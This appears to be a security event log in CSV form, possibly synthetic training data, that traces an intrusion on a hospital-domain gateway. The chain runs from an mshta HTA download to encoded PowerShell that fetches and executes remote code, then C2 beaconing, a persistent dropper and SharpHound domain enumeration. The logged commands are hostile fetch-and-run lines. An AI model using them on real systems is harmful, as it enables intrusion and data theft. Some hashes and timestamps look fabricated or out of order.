SystemTime,Computer,EventID,RuleName,Image,CommandLine,TargetImage,ParentImage,ParentCommandLine,User,SourceIp,DestinationIp,DestinationPort,Protocol,Hashes,GrantedAccess
2024-11-20T23:51:15Z,RDP-GW-01,1,Suspicious Script Execution,C:\Windows\System32\mshta.exe,mshta.exe http://45.129.56.200/lnk.hta,,C:\Windows\explorer.exe,explorer.exe,MEDHEALTHCARE\jdavis,,,,TCP,,
2024-11-20T23:51:28Z,RDP-GW-01,1,Suspicious Child Process,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -windowstyle hidden -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwA5ADEALgAxADAAOAAuADQALgAxADkAMAAvAHUAcABkAGEAdABlAC4AZQB4AGUAJwApAA==,,C:\Windows\System32\mshta.exe,mshta.exe http://45.129.56.200/lnk.hta,MEDHEALTHCARE\jdavis,,,,TCP,,
2024-11-20T23:51:44Z,RDP-GW-01,3,C2 Callback,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,91.108.4.190,443,TCP,,
2024-11-20T23:51:52Z,RDP-GW-01,11,Executable Dropped in Temp,,,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,MEDHEALTHCARE\jdavis,,,,,,
2024-11-20T23:52:03Z,RDP-GW-01,1,Suspicious Executable Run,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,svcupd.exe -install -persist,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -windowstyle hidden,MEDHEALTHCARE\jdavis,,,,TCP,SHA256=3d2bfa6a72a8e98fbb8e5e1b48cdb14012c74f23d1a789e4b0f65a12897cd3e1,
2024-11-20T23:52:19Z,RDP-GW-01,3,C2 Beacon,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,91.108.4.190,443,TCP,,
2024-11-20T23:55:41Z,RDP-GW-01,3,C2 Beacon,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,91.108.4.190,443,TCP,,
2024-11-20T23:56:05Z,RDP-GW-01,1,AD Enumeration Tool,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All --domain MEDHEALTHCARE.LOCAL --outputdirectory C:\Windows\Temp\,,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,svcupd.exe -install -persist,MEDHEALTHCARE\jdavis,,,,TCP,SHA256=9b5c3df6a9f0e1c2b4d8e7a6f5e3c2b1a0d9f8e7c6b5a4d3e2f1c0b9a8d7e6f5,
2024-11-20T23:56:00Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:56:14Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
